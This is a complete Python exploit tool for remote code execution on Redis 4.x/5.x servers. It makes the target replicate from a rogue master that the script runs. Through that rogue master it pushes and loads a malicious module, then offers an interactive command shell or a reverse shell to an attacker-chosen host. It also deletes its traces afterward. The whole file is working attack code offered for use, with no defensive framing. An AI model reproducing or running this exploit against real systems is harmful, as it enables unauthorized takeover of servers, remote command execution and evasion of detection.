#!/usr/bin/env python
# coding:utf-8
import socket
import os
import sys
import re
from time import sleep
import argparse
from six.moves import input

CLRF = "\r\n"
LOGO = R"""
█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                   

"""

def mk_cmd_arr(arr):
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CLRF + "$" + str(len(arg))
        cmd += CLRF + arg
    cmd += "\r\n"
    return cmd


def mk_cmd(raw_cmd):
    return mk_cmd_arr(raw_cmd.split(" "))


def din(sock, cnt):
    msg = sock.recv(cnt)
    if verbose:
        if len(msg) < 300:
            print("\033[1;34;40m[->]\033[0m {}".format(msg))
        else:
            print("\033[1;34;40m[->]\033[0m {}......{}".format(msg[:80], msg[-80:]))
    if sys.version_info < (3, 0):
        res = re.sub(r'[^\x00-\x7f]', r'', msg)
    else:
        res = re.sub(b'[^\x00-\x7f]', b'', msg)
    return res.decode()


def dout(sock, msg):
    if type(msg) != bytes:
        msg = msg.encode()
    sock.send(msg)
    if verbose:
        if sys.version_info < (3, 0):
            msg = repr(msg)
        if len(msg) < 300:
            print("\033[1;32;40m[<-]\033[0m {}".format(msg))
        else:
            print("\033[1;32;40m[<-]\033[0m {}......{}".format(msg[:80], msg[-80:]))


def decode_shell_result(s):
    return "\n".join(s.split("\r\n")[1:-1])


class Remote:
    def __init__(self, rhost, rport):
        self._host = rhost
        self._port = rport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.connect((self._host, self._port))


    def send(self, msg):
        dout(self._sock, msg)

    def recv(self, cnt=65535):
        return din(self._sock, cnt)

    def do(self, cmd):
        self.send(mk_cmd(cmd))
        buf = self.recv()
        return buf

    def close(self):
        self._sock.close()

    def shell_cmd(self, cmd):
        self.send(mk_cmd_arr(['system.exec', "{}".format(cmd)]))
        buf = self.recv()
        return buf

    def reverse_shell(self, addr, port):
        self.send(mk_cmd("system.rev {} {}".format(addr, port)))


class RogueServer:
    def __init__(self, lhost, lport, remote, file):
        self._host = lhost
        self._port = lport
        self._remote = remote
        self._file = file
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.bind(('0.0.0.0', self._port))
        self._sock.settimeout(15)
        self._sock.listen(10)

    def handle(self, data):
        resp = ""
        phase = 0
        if data.find("PING") > -1:
            resp = "+PONG" + CLRF
            phase = 1
        elif data.find("REPLCONF") > -1:
            resp = "+OK" + CLRF
            phase = 2
        elif data.find("AUTH") > -1:
            resp = "+OK" + CLRF
            phase = 3
        elif data.find("PSYNC") > -1 or data.find("SYNC") > -1:
            resp = "+FULLRESYNC " + "Z" * 40 + " 0" + CLRF
            resp += "$" + str(len(payload)) + CLRF
            resp = resp.encode()
            resp += payload + CLRF.encode()
            phase = 4
        return resp, phase

    def close(self):
        self._sock.close()

    def exp(self):
        try:
            cli, addr = self._sock.accept()
            print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(addr[0], addr[1]))
            while True:
                data = din(cli, 1024)
                if len(data) == 0:
                    break
                resp, phase = self.handle(data)
                dout(cli, resp)
                if phase == 4:
                    break
        except Exception as e:
            print("\033[1;31;m[-]\033[0m Error: {}, exit".format(e))
            cleanup(self._remote, self._file)
            exit(0)
        except KeyboardInterrupt:
            print("[-] Exit..")
            exit(0)


def reverse(remote):
    print("[*] Open reverse shell...")
    addr = input("[*] Reverse server address: ")
    port = input("[*] Reverse server port: ")
    remote.reverse_shell(addr, port)
    print("\033[92m[+]\033[0m Reverse shell payload sent.")
    print("[*] Check at {}:{}".format(addr, port))


def interact(remote):
    print("\033[92m[+]\033[0m Interactive shell open , use \"exit\" to exit...")
    try:
        while True:
            cmd = input("$ ")
            cmd = cmd.strip()
            if cmd == "exit":
                return
            r = remote.shell_cmd(cmd)
            if 'unknown command' in r:
                print("\033[1;31;m[-]\033[0m Error:{} , check your module!".format(r.strip()))
                return
            for l in decode_shell_result(r).split("\n"):
                if l:
                    print(l)
    except KeyboardInterrupt:
        return

def cleanup(remote, expfile):
    # clean up
    print("[*] Clean up..")
    remote.do("CONFIG SET dbfilename dump.rdb")
    remote.shell_cmd("rm ./{}".format(expfile))
    remote.do("MODULE UNLOAD system")
    remote.close()

def printback(remote):
    back = remote._sock.getpeername()
    print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(back[0], back[1]))


def runserver(rhost, rport, lhost, lport):
    # get expolit filename
    expfile = os.path.basename(filename)
    #start exploit
    try:
        remote = Remote(rhost, rport)
        if auth:
            check = remote.do("AUTH {}".format(auth))
            if "invalid password" in check:
                print("\033[1;31;m[-]\033[0m Wrong password !")
                return
        else:
            info = remote.do("INFO")
            if "NOAUTH" in info:
                print("\033[1;31;m[-]\033[0m Need password.")
                return


        print("[*] Sending SLAVEOF command to server")
        remote.do("SLAVEOF {} {}".format(lhost, lport))
        printback(remote)
        print("[*] Setting filename")
        remote.do("CONFIG SET dbfilename {}".format(expfile))
        printback(remote)
        sleep(2)
        print("[*] Start listening on {}:{}".format(lhost, lport))
        rogue = RogueServer(lhost, lport, remote, expfile)
        print("[*] Tring to run payload")
        rogue.exp()
        sleep(2)
        remote.do("MODULE LOAD ./{}".format(expfile))
        remote.do("SLAVEOF NO ONE")
        print("[*] Closing rogue server...\n")
        rogue.close()
        # Operations here
        choice = input("\033[92m[+]\033[0m What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: ")
        if choice.startswith("i"):
            interact(remote)
        elif choice.startswith("r"):
            reverse(remote)
        elif choice.startswith("e"):
            pass

        cleanup(remote, expfile)

        remote.close()
    except Exception as e:
        print("\033[1;31;m[-]\033[0m Error found : {} \n[*] Exit..".format(e))

def main():
    parser = argparse.ArgumentParser(description='Redis 4.x/5.x RCE with RedisModules')
    parser.add_argument("-r", "--rhost", dest="rhost", type=str, help="target host", required=True)
    parser.add_argument("-p", "--rport", dest="rport", type=int,
                        help="target redis port, default 6379", default=6379)
    parser.add_argument("-L", "--lhost", dest="lhost", type=str,
                        help="rogue server ip", required=True)
    parser.add_argument("-P", "--lport", dest="lport", type=int,
                        help="rogue server listen port, default 21000", default=21000)
    parser.add_argument("-f", "--file", type=str, help="RedisModules to load, default exp.so", default='exp_lin.so')
    parser.add_argument("-a", "--auth", dest="auth", type=str, help="redis password")
    parser.add_argument("-v", "--verbose", action="store_true", help="show more info", default=False)
    options = parser.parse_args()
    # runserver("127.0.0.1", 6379, "127.0.0.1", 21000)

    print("[*] Connecting to  {}:{}...".format(options.rhost, options.rport))
    global payload, verbose, filename, auth
    auth = options.auth
    filename = options.file
    verbose = options.verbose
    if os.path.exists(filename) == False:
        print("\033[1;31;m[-]\033[0m Where you module? ")
        exit(0)
    payload = open(filename, "rb").read()
    runserver(options.rhost, options.rport, options.lhost, options.lport)


if __name__ == '__main__':
    print(LOGO)
    main()